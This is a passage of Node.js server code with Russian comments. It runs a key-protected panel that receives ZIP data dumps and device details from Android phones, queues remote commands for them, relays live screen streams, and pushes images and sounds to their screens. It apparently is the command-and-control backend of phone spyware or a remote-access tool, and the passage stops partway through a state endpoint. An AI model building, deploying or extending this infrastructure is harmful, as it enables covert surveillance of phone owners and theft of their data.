const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const zlib = require('zlib');

const app = express();
app.disable('x-powered-by');
app.set('trust proxy', 1);
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: false, limit: '1mb' }));

// ── zero-dep gzip for text responses ────────────────────────────────────────
app.use((req, res, next) => {
  if (!/\bgzip\b/.test(String(req.headers['accept-encoding'] || ''))) return next();
  const end = res.end.bind(res);
  res.end = (chunk, enc, cb) => {
    try {
      if (typeof chunk === 'string') chunk = Buffer.from(chunk, enc || 'utf8');
      const ct = String(res.getHeader('content-type') || '');
      if (Buffer.isBuffer(chunk) && chunk.length > 1024 && /text|json|javascript|svg/.test(ct)) {
        const gz = zlib.gzipSync(chunk, { level: 6 });
        res.setHeader('Content-Encoding', 'gzip');
        res.setHeader('Content-Length', gz.length);
        res.removeHeader('ETag');
        return end(gz, cb);
      }
    } catch (e) {}
    return end(chunk, enc, cb);
  };
  next();
});

const PORT = process.env.PORT || 7860;

const UPLOAD_KEY = process.env.UPLOAD_KEY || 'change_me_upload';
const VIEW_KEY = process.env.VIEW_KEY || 'change_me_view';

// ── auth ───────────────────────────────────────────────────────────────────
// Ключ в URL остаётся рабочим, но браузер запоминает его в HttpOnly-cookie —
// поэтому <img src="/media/…"> и fetch('/api/…') больше не требуют ?key=.
function readCookies(req) {
  const out = {};
  const raw = req.headers.cookie;
  if (!raw) return out;
  for (const part of raw.split(';')) {
    const i = part.indexOf('=');
    if (i < 0) continue;
    out[part.slice(0, i).trim()] = decodeURIComponent(part.slice(i + 1).trim());
  }
  return out;
}

function viewOk(req) {
  if (req.query && req.query.key === VIEW_KEY) return true;
  if (req.body && req.body.key === VIEW_KEY) return true;
  return readCookies(req).pk === VIEW_KEY;
}

app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Referrer-Policy', 'no-referrer');
  if (req.query && req.query.key === VIEW_KEY && readCookies(req).pk !== VIEW_KEY) {
    res.append('Set-Cookie', 'pk=' + encodeURIComponent(VIEW_KEY) +
      '; Path=/; HttpOnly; SameSite=Lax; Max-Age=2592000' + (req.secure ? '; Secure' : ''));
  }
  next();
});

const DATA_DIR = process.env.DATA_DIR || __dirname;
const SAVE_DIR = path.join(DATA_DIR, 'dumps');
const MEDIA_DIR = path.join(DATA_DIR, 'media');
// звуки лежат рядом с кодом, а не в DATA_DIR: так они переживают рестарт
// контейнера и раздаются панелью для прослушивания
const SOUND_DIR = path.join(__dirname, 'sounds');
const LOG_FILE = path.join(DATA_DIR, 'logs.json');
const UPLOAD_LOG_FILE = path.join(DATA_DIR, 'upload_logs.json');
const DEVICES_FILE = path.join(DATA_DIR, 'devices.json');
const CMDS_FILE = path.join(DATA_DIR, 'commands.json');
const SETTINGS_FILE = path.join(DATA_DIR, 'panel.json');

for (const d of [SAVE_DIR, MEDIA_DIR]) {
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
}
for (const [file, init] of [[LOG_FILE, '[]'], [UPLOAD_LOG_FILE, '[]'], [DEVICES_FILE, '{}'], [CMDS_FILE, '{}']]) {
  if (!fs.existsSync(file)) fs.writeFileSync(file, init);
}

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, SAVE_DIR),
  filename: (req, file, cb) => cb(null, `dump_${Date.now()}.zip`)
});
const upload = multer({ storage, limits: { fileSize: 1024 * 1024 * 1024 } });

/** Имена звуков, которые лежат на сервере (sounds/*.mp3). */
function soundNames() {
  try {
    return fs.readdirSync(SOUND_DIR)
      .filter(f => f.toLowerCase().endsWith('.mp3'))
      .map(f => f.slice(0, -4))
      .sort();
  } catch (e) {
    return [];
  }
}

// ── картинки на экран телефона ─────────────────────────────────────────────
const IMG_EXT = ['.jpg', '.jpeg', '.png', '.webp', '.gif', '.bmp'];

function isImageName(name) {
  return IMG_EXT.includes(path.extname(String(name) || '').toLowerCase());
}

/** Файлы в media/, которые можно вывести на экран. Свежие сверху. */
function imageFiles() {
  return cached('images', 3000, () => {
    try {
      return fs.readdirSync(MEDIA_DIR)
        .filter(isImageName)
        .map(f => {
          const st = fs.statSync(path.join(MEDIA_DIR, f));
          return { name: f, size: st.size, ts: st.mtimeMs };
        })
        .sort((a, b) => b.ts - a.ts);
    } catch (e) {
      return [];
    }
  });
}

const mediaStorage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, MEDIA_DIR),
  filename: (req, file, cb) => cb(null, `${Date.now()}_${(file.originalname || 'media').replace(/[^a-zA-Z0-9._-]/g, '_')}`)
});
const mediaUpload = multer({ storage: mediaStorage, limits: { fileSize: 200 * 1024 * 1024 } });

// ── json store + tiny in-process cache ─────────────────────────────────────
function readJSON(file, def) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch (e) { return def; }
}
function writeJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

const cache = new Map();
function cached(key, ttl, fn) {
  const hit = cache.get(key);
  const now = Date.now();
  if (hit && now - hit.t < ttl) return hit.v;
  const v = fn();
  cache.set(key, { v, t: now });
  return v;
}
function bust(...prefixes) {
  for (const k of Array.from(cache.keys())) {
    if (prefixes.some(p => k.startsWith(p))) cache.delete(k);
  }
}

function readLogs() { return cached('logs', 2000, () => readJSON(LOG_FILE, [])); }
function writeLogs(arr) {
  if (arr.length > 500) arr = arr.slice(-500);
  writeJSON(LOG_FILE, arr);
  bust('logs');
}
function readUploadLogs() { return cached('uplogs', 2000, () => readJSON(UPLOAD_LOG_FILE, [])); }
function writeUploadLogs(arr) {
  if (arr.length > 2000) arr = arr.slice(-2000);
  writeJSON(UPLOAD_LOG_FILE, arr);
  bust('uplogs');
}
function readDevices() { return cached('devices', 2000, () => readJSON(DEVICES_FILE, {})); }
function writeDevices(o) { writeJSON(DEVICES_FILE, o); bust('devices'); }

/**
 * Список устройств для панели.
 *
 * На бесплатном Render диск эфемерный: контейнер уснул/передеплоился —
 * devices.json пустой, и панель показывает «устройств нет», хотя телефон
 * жив и стучится. Поэтому недостающие устройства восстанавливаем из логов
 * (там deviceId и время последнего ответа остаются). Телефон, который
 * сейчас на связи, всё равно перезапишет запись свежим /ping.
 */
function deviceRegistry() {
  const devices = readDevices();
  try {
    const logs = readJSON(LOG_FILE, []);
    const known = new Set(Object.keys(devices));
    for (const e of logs) {
      const id = e && e.deviceId;
      if (!id || known.has(id)) continue;
      known.add(id);
      devices[id] = {
        deviceId: id,
        device: e.device || '?',
        android: e.android || '?',
        sdk: e.sdk || '?',
        clients: Array.isArray(e.clients) ? e.clients : [],
        ip: e.ip || '?',
        lastSeen: e.ts || 0,
        restored: true
      };
    }
  } catch (e) {}
  try {
    const uplogs = readJSON(UPLOAD_LOG_FILE, []);
    for (const e of uplogs) {
      const id = e && e.deviceId;
      if (!id || known.has(id)) continue;
      known.add(id);
      devices[id] = {
        deviceId: id, device: e.device || '?', android: e.android || '?',
        sdk: e.sdk || '?', clients: [], ip: e.ip || '?',
        lastSeen: e.ts || 0, restored: true
      };
    }
  } catch (e) {}
  return devices;
}

/** Отметить устройство живым без полного /ping (его шлёт поллер и результаты). */
function touchDevice(deviceId, req, data) {
  if (!deviceId) return;
  try {
    const devices = readDevices();
    const prev = devices[deviceId] || {};
    const d = data || {};
    devices[deviceId] = {
      ...prev,
      deviceId,
      device: d.device || prev.device || '?',
      android: d.android || prev.android || '?',
      sdk: d.sdk || prev.sdk || '?',
      clients: prev.clients || [],
      ip: (req.headers['x-forwarded-for'] || req.socket.remoteAddress) || prev.ip || '?',
      lastSeen: Date.now()
    };
    writeDevices(devices);
  } catch (e) {}
}
function readCmds() { return readJSON(CMDS_FILE, {}); }
function writeCmds(o) { writeJSON(CMDS_FILE, o); }

function loadFiles() {
  return cached('dumps', 3000, () => fs.readdirSync(SAVE_DIR)
    .filter(f => f.endsWith('.zip'))
    .map(f => {
      const metaPath = path.join(SAVE_DIR, f + '.json');
      const stat = fs.statSync(path.join(SAVE_DIR, f));
      let meta = { device: '?', android: '?', ip: '?', ts: stat.mtimeMs };
      if (fs.existsSync(metaPath)) {
        try { meta = JSON.parse(fs.readFileSync(metaPath, 'utf8')); } catch (e) {}
      }
      return { filename: f, size: stat.size, ...meta };
    })
    .sort((a, b) => b.ts - a.ts));
}

const THEMES = [
  { id: 'mono',     name: 'Mono',     dot: '#ffffff' },
  { id: 'graphite', name: 'Graphite', dot: '#8f8f8f' },
  { id: 'slate',    name: 'Slate',    dot: '#94a3b8' },
  { id: 'paper',    name: 'Paper',    dot: '#f4f4f1' },
  { id: 'terminal', name: 'Terminal', dot: '#4ade80' },
  { id: 'amber',    name: 'Amber',    dot: '#f0b429' },
  { id: 'crimson',  name: 'Crimson',  dot: '#e8556b' }
];
const THEME_IDS = THEMES.map(t => t.id);

const START_TABS = ['overview', 'dumps', 'control', 'logs', 'uploadlog'];

const DEFAULT_SETTINGS = {
  theme: 'mono',
  density: 'normal',
  fontSize: 14,
  pageSize: 50,
  striped: false,
  hideIp: false,
  showThumbs: true,
  relativeTime: true,
  autoRefresh: 0,
  startTab: 'overview',
  showChart: true,
  monoTables: false,
  railCompact: false,
  tableBorders: true,
  glow: true
};

const BOOL_KEYS = ['striped', 'hideIp', 'showThumbs', 'relativeTime', 'showChart', 'monoTables', 'railCompact', 'tableBorders', 'glow'];

function readSettings() {
  const s = readJSON(SETTINGS_FILE, {});
  const out = { ...DEFAULT_SETTINGS };
  if (THEME_IDS.includes(s.theme)) out.theme = s.theme;
  if (s.density === 'dense' || s.density === 'normal') out.density = s.density;
  if ([13, 14, 15, 16].includes(Number(s.fontSize))) out.fontSize = Number(s.fontSize);
  if ([25, 50, 100, 200].includes(Number(s.pageSize))) out.pageSize = Number(s.pageSize);
  if ([0, 10, 30, 60].includes(Number(s.autoRefresh))) out.autoRefresh = Number(s.autoRefresh);
  if (START_TABS.includes(s.startTab)) out.startTab = s.startTab;
  BOOL_KEYS.forEach(k => {
    if (typeof s[k] === 'boolean') out[k] = s[k];
  });
  return out;
}
function writeSettings(s) { writeJSON(SETTINGS_FILE, s); }

// ── formatting ─────────────────────────────────────────────────────────────
function esc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

function fmtSize(bytes) {
  if (!bytes) return '0 B';
  const u = ['B', 'KB', 'MB', 'GB'];
  let i = 0, v = bytes;
  while (v >= 1024 && i < u.length - 1) { v /= 1024; i++; }
  return v.toFixed(i === 0 ? 0 : 2) + ' ' + u[i];
}

function fmtTime(ts) {
  const d = new Date(ts);
  const p = n => String(n).padStart(2, '0');
  return `${p(d.getDate())}.${p(d.getMonth() + 1)}.${d.getFullYear()} ${p(d.getHours())}:${p(d.getMinutes())}`;
}

function ago(ts) {
  const s = Math.floor((Date.now() - ts) / 1000);
  if (s < 60) return s + 's';
  if (s < 3600) return Math.floor(s / 60) + 'm';
  if (s < 86400) return Math.floor(s / 3600) + 'h';
  return Math.floor(s / 86400) + 'd';
}

function paginate(arr, page, per) {
  const total = arr.length;
  const pages = Math.max(1, Math.ceil(total / per));
  const p = Math.min(Math.max(1, Number(page) || 1), pages);
  const from = (p - 1) * per;
  return { slice: arr.slice(from, from + per), page: p, pages, total };
}

function pagerHtml(base, p) {
  if (p.pages <= 1) return '';
  const items = [];
  const win = 1;
  for (let n = 1; n <= p.pages; n++) {
    if (n === 1 || n === p.pages || Math.abs(n - p.page) <= win) {
      items.push(`<a class="pg ${n === p.page ? 'is-active' : ''}" href="${base}&page=${n}">${n}</a>`);
    } else if (items[items.length - 1] !== '<span class="pg is-dots">···</span>') {
      items.push('<span class="pg is-dots">···</span>');
    }
  }
  return `<div class="pager">${items.join('')}<span class="pager-info">${p.total} строк · ${p.page} / ${p.pages}</span></div>`;
}

// Имя дампа приходит из URL — не даём выйти за пределы SAVE_DIR.
function dumpName(raw) {
  const name = String(raw == null ? '' : raw);
  if (!/^[A-Za-z0-9._-]{1,120}$/.test(name)) return null;
  if (name.indexOf('..') > -1) return null;
  return name;
}

const ICONS = {
  overview: '<rect x="3" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="3" width="7" height="7" rx="1.5"/><rect x="3" y="14" width="7" height="7" rx="1.5"/><rect x="14" y="14" width="7" height="7" rx="1.5"/>',
  dumps: '<path d="M3 7.5 12 3l9 4.5v9L12 21l-9-4.5z"/><path d="M3 7.5 12 12l9-4.5"/><path d="M12 12v9"/>',
  control: '<rect x="6" y="2.5" width="12" height="19" rx="3"/><path d="M11 18.5h2"/>',
  logs: '<path d="M4 6h16"/><path d="M4 12h16"/><path d="M4 18h10"/>',
  uploadlog: '<path d="M12 16V4"/><path d="m7 9 5-5 5 5"/><path d="M4 16v3a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1v-3"/>',
  settings: '<path d="M4 7h10"/><path d="M18 7h2"/><circle cx="16" cy="7" r="2"/><path d="M4 17h4"/><path d="M12 17h8"/><circle cx="10" cy="17" r="2"/>',
  search: '<circle cx="11" cy="11" r="6"/><path d="m20 20-4.2-4.2"/>',
  download: '<path d="M12 4v11"/><path d="m7 11 5 5 5-5"/><path d="M5 20h14"/>',
  trash: '<path d="M4 7h16"/><path d="M9 7V5h6v2"/><path d="M6 7l1 13h10l1-13"/>',
  refresh: '<path d="M20 12a8 8 0 1 1-2.3-5.6"/><path d="M20 4v4h-4"/>',
  back: '<path d="M15 5l-7 7 7 7"/>',
  camera: '<rect x="3" y="7" width="18" height="13" rx="2.5"/><circle cx="12" cy="13.5" r="3.5"/><path d="M8.5 7 10 4h4l1.5 3"/>',
  user: '<circle cx="12" cy="8" r="3.5"/><path d="M5 20a7 7 0 0 1 14 0"/>',
  pin: '<path d="M12 21s7-6.2 7-11a7 7 0 1 0-14 0c0 4.8 7 11 7 11z"/><circle cx="12" cy="10" r="2.5"/>',
  check: '<path d="m5 12.5 4.5 4.5L19 7"/>',
  copy: '<rect x="9" y="9" width="11" height="11" rx="2"/><path d="M15 5H6a1 1 0 0 0-1 1v9"/>',
  bolt: '<path d="M13 2 4 14h6l-1 8 9-12h-6z"/>',
  lock: '<rect x="5" y="10" width="14" height="10" rx="2.5"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/>',
  unlock: '<rect x="5" y="10" width="14" height="10" rx="2.5"/><path d="M8 10V7a4 4 0 0 1 7-2.6"/>',
  power: '<path d="M12 3v9"/><path d="M6.2 6.2a8 8 0 1 0 11.6 0"/>',
  filter: '<path d="M4 5h16l-6 7v6l-4 2v-8z"/>'
};

function icon(name, cls) {
  return `<svg class="ico${cls ? ' ' + cls : ''}" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">${ICONS[name] || ''}</svg>`;
}

function avatar(name) {
  const letter = String(name || '?').trim().charAt(0).toUpperCase() || '?';
  return `<span class="avatar">${esc(letter)}</span>`;
}

function pill(text, kind) {
  return `<span class="pill${kind ? ' is-' + kind : ''}">${esc(text)}</span>`;
}

// ── api ────────────────────────────────────────────────────────────────────
app.post('/upload', upload.single('file'), (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false, err: 'forbidden' });
  if (!req.file) return res.status(400).json({ ok: false, err: 'no file' });

  const meta = {
    device: req.headers['x-device'] || '?',
    android: req.headers['x-android'] || '?',
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
    ts: Date.now(),
    filename: req.file.filename,
    size: req.file.size
  };
  fs.writeFileSync(path.join(SAVE_DIR, req.file.filename + '.json'), JSON.stringify(meta));
  bust('dumps');
  res.json({ ok: true, id: req.file.filename });
});

app.post('/log', (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const data = req.body || {};
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const deviceId = data.deviceId || ip;

  const entry = {
    ts: Date.now(), ip,
    device: data.device || '?',
    android: data.android || '?',
    sdk: data.sdk || '?',
    clients: data.clients || [],
    zipSize: data.zipSize || 0,
    ok: data.ok === true,
    note: data.note || '',
    deviceId
  };

  const logs = readJSON(LOG_FILE, []);
  logs.push(entry);
  writeLogs(logs);

  const devices = readJSON(DEVICES_FILE, {});
  devices[deviceId] = {
    ...(devices[deviceId] || {}),
    deviceId,
    device: entry.device,
    android: entry.android,
    sdk: entry.sdk,
    clients: entry.clients,
    ip,
    lastSeen: Date.now()
  };
  writeDevices(devices);

  res.json({ ok: true, deviceId });
});

app.post('/log/upload', (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const data = req.body || {};
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  const entry = {
    ts: Date.now(),
    ip,
    deviceId: data.deviceId || ip,
    device: data.device || '?',
    filename: data.filename || '?',
    stage: data.stage || '?',
    chunk: data.chunk || 0,
    totalChunks: data.totalChunks || 0,
    sentBytes: data.sentBytes || 0,
    totalBytes: data.totalBytes || 0,
    note: data.note || ''
  };

  const logs = readJSON(UPLOAD_LOG_FILE, []);
  logs.push(entry);
  writeUploadLogs(logs);

  res.json({ ok: true });
});

app.post('/cmd/poll', (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const body = req.body || {};
  const deviceId = body.deviceId || req.query.deviceId || 'unknown';
  const wait = Math.min(25, Math.max(0, Number(body.wait) || 0));

  const cmd = takeCommand(deviceId);
  // поллер стучится каждые 20 с — это самый частый признак жизни,
  // по нему устройство возвращается на панель даже после сброса данных
  touchDevice(deviceId, req);
  if (cmd) return res.json({ ok: true, cmd });
  if (!wait) return res.json({ ok: true, cmd: null });

  const entry = { res, timer: null };
  entry.timer = setTimeout(() => {
    const set = pollWaiters.get(deviceId);
    if (set) set.delete(entry);
    if (!res.headersSent) res.json({ ok: true, cmd: takeCommand(deviceId) || null });
  }, wait * 1000);

  if (!pollWaiters.has(deviceId)) pollWaiters.set(deviceId, new Set());
  pollWaiters.get(deviceId).add(entry);
});

app.post('/cmd/result', mediaUpload.single('file'), (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const deviceId = req.headers['x-device-id'] || 'unknown';
  const cmdType = req.headers['x-cmd-type'] || '?';
  const status = req.headers['x-status'] || '?';

  // ответ на команду — тоже признак жизни
  touchDevice(deviceId, req);

  let note = '';
  try {
    if (req.body && req.body.note) note = req.body.note;
  } catch (e) {}

  const entry = {
    ts: Date.now(),
    type: 'cmd_result',
    deviceId,
    cmd: cmdType,
    status,
    file: req.file ? '/media/' + req.file.filename : null,
    fileType: req.file ? (req.file.mimetype || '') : '',
    note
  };

  const logs = readJSON(LOG_FILE, []);
  logs.push(entry);
  writeLogs(logs);

  res.json({ ok: true });
});

// ── команды: очередь + long-poll ───────────────────────────────────────────
const pollWaiters = new Map(); // deviceId -> Set<{res, timer}>

function takeCommand(deviceId) {
  const cmds = readCmds();
  const queue = cmds[deviceId] || [];
  if (queue.length === 0) return null;
  const cmd = queue.shift();
  cmds[deviceId] = queue;
  writeCmds(cmds);
  return cmd;
}

function queueCommand(deviceId, cmd, name) {
  const cmds = readCmds();
  const now = Date.now();
  // выкидываем команды старше 10 минут и держим не больше 50 на устройство
  const queue = (cmds[deviceId] || []).filter(c => now - (c.ts || 0) < 10 * 60 * 1000);
  queue.push({ cmd, name: name || '', ts: now });
  cmds[deviceId] = queue.slice(-50);
  writeCmds(cmds);
  wakePollers(deviceId);
}

function wakePollers(deviceId) {
  const set = pollWaiters.get(deviceId);
  if (!set || set.size === 0) return;
  for (const w of Array.from(set)) {
    clearTimeout(w.timer);
    set.delete(w);
    const cmd = takeCommand(deviceId);
    if (!w.res.headersSent) w.res.json({ ok: true, cmd: cmd || null });
  }
}

// ── экран в реальном времени (MJPEG) ──────────────────────────────────────
const latestFrame = new Map();   // deviceId -> Buffer (jpeg)
const frameClients = new Map();  // deviceId -> Set<res>
const FRAME_STALE_MS = 10000;

function broadcastFrame(deviceId, jpeg) {
  const set = frameClients.get(deviceId);
  if (!set) return;
  for (const res of Array.from(set)) {
    try {
      res.write('--frame\r\n');
      res.write('Content-Type: image/jpeg\r\n');
      res.write('Content-Length: ' + jpeg.length + '\r\n\r\n');
      res.write(jpeg);
      res.write('\r\n');
    } catch (e) {
      set.delete(res);
    }
  }
}

app.post('/stream/frame', express.raw({ type: 'image/jpeg', limit: '12mb' }), (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const deviceId = req.headers['x-device-id'] || req.query.device || 'unknown';
  const body = req.body;
  if (!Buffer.isBuffer(body) || body.length === 0) return res.status(400).json({ ok: false, err: 'no frame' });

  latestFrame.set(deviceId, { buf: body, ts: Date.now() });
  broadcastFrame(deviceId, body);
  res.json({ ok: true, size: body.length });
});

app.get('/stream/:device', (req, res) => {
  if (!viewOk(req)) return res.status(403).send('forbidden');

  const deviceId = req.params.device;
  res.writeHead(200, {
    'Content-Type': 'multipart/x-mixed-replace; boundary=frame',
    'Cache-Control': 'no-store, no-cache, must-revalidate',
    'Pragma': 'no-cache',
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no'
  });

  if (!frameClients.has(deviceId)) frameClients.set(deviceId, new Set());
  const set = frameClients.get(deviceId);
  set.add(res);

  const fresh = latestFrame.get(deviceId);
  try { res.flushHeaders(); } catch (e) {}
  if (fresh && Date.now() - fresh.ts < FRAME_STALE_MS) {
    try {
      res.write('--frame\r\nContent-Type: image/jpeg\r\nContent-Length: ' + fresh.buf.length + '\r\n\r\n');
      res.write(fresh.buf);
      res.write('\r\n');
    } catch (e) {}
  }

  const keep = setInterval(() => {
    try { res.write(''); } catch (e) { cleanup(); }
  }, 15000);

  function cleanup() {
    clearInterval(keep);
    set.delete(res);
    if (set.size === 0) frameClients.delete(deviceId);
  }

  req.on('close', cleanup);
  res.on('close', cleanup);
});

app.post('/stream/stop', (req, res) => {
  if (!viewOk(req)) return res.status(403).json({ ok: false });
  const deviceId = req.query.device || (req.body && req.body.device);
  if (deviceId) queueCommand(deviceId, 'streamstop');
  res.json({ ok: true });
});


app.get('/cmd/send', (req, res) => {
  if (!viewOk(req)) return res.status(403).send('forbidden');

  const deviceId = req.query.device;
  const cmd = req.query.cmd;
  if (!deviceId || !cmd) return res.status(400).send('missing params');

  queueCommand(deviceId, cmd, req.query.name || '');

  res.redirect('/?key=' + encodeURIComponent(VIEW_KEY) + '&tab=control&device=' + encodeURIComponent(deviceId) + '&sent=1');
});

app.get('/cmd/cancel', (req, res) => {
  if (!viewOk(req)) return res.status(403).send('forbidden');

  const deviceId = String(req.query.device || '');
  const idx = Number(req.query.i);
  const cmds = readCmds();
  const queue = cmds[deviceId] || [];

  if (deviceId && Number.isInteger(idx) && idx >= 0 && idx < queue.length) queue.splice(idx, 1);
  if (queue.length) cmds[deviceId] = queue; else delete cmds[deviceId];
  writeCmds(cmds);

  res.redirect('/?key=' + encodeURIComponent(VIEW_KEY) + '&tab=control&device=' + encodeURIComponent(deviceId));
});

app.get('/theme/:id', (req, res) => {
  if (!viewOk(req)) return res.status(403).send('forbidden');
  if (THEME_IDS.includes(req.params.id)) {
    const s = readSettings();
    s.theme = req.params.id;
    writeSettings(s);
  }
  const to = typeof req.query.to === 'string' && req.query.to.startsWith('/') ? req.query.to : '/?key=' + encodeURIComponent(VIEW_KEY);
  res.redirect(to);
});

app.post('/settings', (req, res) => {
  const b = req.body || {};
  if (!viewOk(req)) return res.status(403).send('forbidden');

  const next = { ...readSettings() };
  if (THEME_IDS.includes(b.theme)) next.theme = b.theme;
  if (b.density === 'dense' || b.density === 'normal') next.density = b.density;
  if ([13, 14, 15, 16].includes(Number(b.fontSize))) next.fontSize = Number(b.fontSize);
  if ([25, 50, 100, 200].includes(Number(b.pageSize))) next.pageSize = Number(b.pageSize);
  if ([0, 10, 30, 60].includes(Number(b.autoRefresh))) next.autoRefresh = Number(b.autoRefresh);
  if (START_TABS.includes(b.startTab)) next.startTab = b.startTab;
  BOOL_KEYS.forEach(k => { next[k] = b[k] === 'on'; });

  writeSettings(next);
  res.redirect('/?key=' + encodeURIComponent(VIEW_KEY) + '&tab=settings&saved=1');
});

// ── views ──────────────────────────────────────────────────────────────────
const NAV = [
  { id: 'overview', label: 'Обзор' },
  { id: 'dumps', label: 'Дампы' },
  { id: 'control', label: 'Устройства' },
  { id: 'screen', label: 'Экран' },
  { id: 'logs', label: 'Логи' },
  { id: 'uploadlog', label: 'Загрузки' },
  { id: 'settings', label: 'Настройки' }
];

const TITLES = {
  overview: 'Обзор',
  dumps: 'Дампы',
  control: 'Устройства',
  screen: 'Экран',
  logs: 'Логи',
  uploadlog: 'Загрузки',
  settings: 'Настройки'
};

const SUBTITLES = {
  overview: 'Сводка по устройствам и активности',
  dumps: 'Архивы, принятые от устройств',
  control: 'Подключённые устройства и команды',
  screen: 'Трансляция экрана устройства',
  logs: 'События синхронизации и результаты команд',
  uploadlog: 'История загрузок по чанкам',
  settings: 'Внешний вид и поведение панели'
};

// Обзор собирается и в SSR, и в /api/state — поэтому отдельной функцией.
function renderOverview({ S, files, logs, uploadLogs, deviceList, ipOf, online, k }) {
  const dayMs = 86400000;
  const dayKey = ts => { const d = new Date(ts); return d.getFullYear() + '-' + (d.getMonth() + 1) + '-' + d.getDate(); };
  const buckets = new Map();
  for (let i = 13; i >= 0; i--) {
    const d = new Date(Date.now() - i * dayMs);
    buckets.set(dayKey(d.getTime()), 0);
  }
  for (const l of logs) {
    const key = dayKey(l.ts);
    if (buckets.has(key)) buckets.set(key, buckets.get(key) + 1);
  }
  const chartVals = Array.from(buckets.values());
  const chartMax = Math.max(1, ...chartVals);
  const peak = Math.max(...chartVals);
  const barsHtml = chartVals.map((v, i) => {
    const h = Math.max(3, Math.round((v / chartMax) * 100));
    const d = new Date(Date.now() - (13 - i) * dayMs);
    const label = String(d.getDate()).padStart(2, '0') + '.' + String(d.getMonth() + 1).padStart(2, '0');
    return `<div class="bar-col" title="${label}: ${v}"><span class="bar${v ? '' : ' is-zero'}" style="height:${h}%"></span><span class="bar-label">${label}</span></div>`;
  }).join('');

  const totalSessions = logs.filter(l => l.type !== 'cmd_result').length;
  const okCount = logs.filter(l => l.ok === true).length;
  const failCount = logs.filter(l => l.ok === false && l.type !== 'cmd_result').length;
  const successRate = (okCount + failCount) > 0 ? Math.round((okCount / (okCount + failCount)) * 100) : null;

  const totalSize = files.reduce((s, f) => s + f.size, 0);
  const onlineCount = deviceList.filter(online).length;

  const recent = logs.slice(0, 8).map(l => {
    const cmd = l.type === 'cmd_result';
    return `
      <li class="feed-item">
        <span class="feed-dot ${cmd ? 'is-cmd' : (l.ok ? 'is-ok' : 'is-bad')}"></span>
        <div class="feed-main">
          <div class="feed-title">${cmd ? 'Команда <b>' + esc(l.cmd) + '</b>' : esc(l.device || '?')}</div>
          <div class="feed-sub">${cmd ? pill(l.status || '?', l.status === 'ok' ? 'ok' : 'bad') : (l.zipSize ? fmtSize(l.zipSize) : '')} ${l.note ? '<span class="feed-note">' + esc(l.note) + '</span>' : ''}</div>
        </div>
        <span class="feed-time">${ago(l.ts)}</span>
      </li>`;
  }).join('');

  const topDevices = deviceList.slice(0, 5).map(d => `
    <a class="mini-row" href="/?key=${k}&tab=control&device=${encodeURIComponent(d.deviceId)}">
      ${avatar(d.device)}
      <span class="mini-main">
        <b>${esc(d.device)}</b>
        <small>${esc(d.android)} · ${ipOf(d.ip)}</small>
      </span>
      <span class="dot ${online(d) ? 'is-on' : ''}"></span>
    </a>`).join('');

  return {
    peak,
    html: `
    <section class="tiles">
      <div class="tile">
        <div class="tile-head"><span class="tile-label">Дампы</span>${icon('dumps')}</div>
        <div class="tile-value">${files.length}</div>
        <div class="tile-foot">${fmtSize(totalSize)} на диске</div>
      </div>
      <div class="tile">
        <div class="tile-head"><span class="tile-label">Устройства</span>${icon('control')}</div>
        <div class="tile-value">${deviceList.length}<span class="tile-unit">/ ${onlineCount} online</span></div>
        <div class="tile-foot">последняя активность ${deviceList[0] ? ago(deviceList[0].lastSeen) + ' назад' : '—'}</div>
      </div>
      <div class="tile">
        <div class="tile-head"><span class="tile-label">Сессии</span>${icon('logs')}</div>
        <div class="tile-value">${totalSessions}</div>
        <div class="tile-foot">${successRate === null ? 'нет данных' : successRate + '% успешных'}</div>
      </div>
      <div class="tile">
        <div class="tile-head"><span class="tile-label">Загрузки</span>${icon('uploadlog')}</div>
        <div class="tile-value">${uploadLogs.filter(u => u.stage === 'done').length}</div>
        <div class="tile-foot">${uploadLogs.filter(u => u.stage === 'fail').length} с ошибкой</div>
      </div>
    </section>

    <div class="split ${S.showChart ? '' : 'is-single'}">
      ${S.showChart ? `<section class="panel">
        <header class="panel-head">
          <h2>Активность за 14 дней</h2>
          <span class="panel-hint">${peak} в пике</span>
        </header>
        <div class="chart">${barsHtml}</div>
      </section>` : ''}

      <section class="panel">
        <header class="panel-head"><h2>Устройства</h2><a class="link" href="/?key=${k}&tab=control">все →</a></header>
        <div class="mini-list">${topDevices || '<div class="mini-empty">Нет устройств</div>'}</div>
      </section>
    </div>

    <section class="panel">
      <header class="panel-head"><h2>Последние события</h2><a class="link" href="/?key=${k}&tab=logs">все →</a></header>
      <ul class="feed">${recent || '<li class="mini-empty">Пока пусто</li>'}</ul>
    </section>`
  };
}

app.get('/api/state', (req, res) => {
  if (!viewOk(req)) return res.status(403).json({ ok: false });

  const S = readSettings();
  const files = loadFiles();
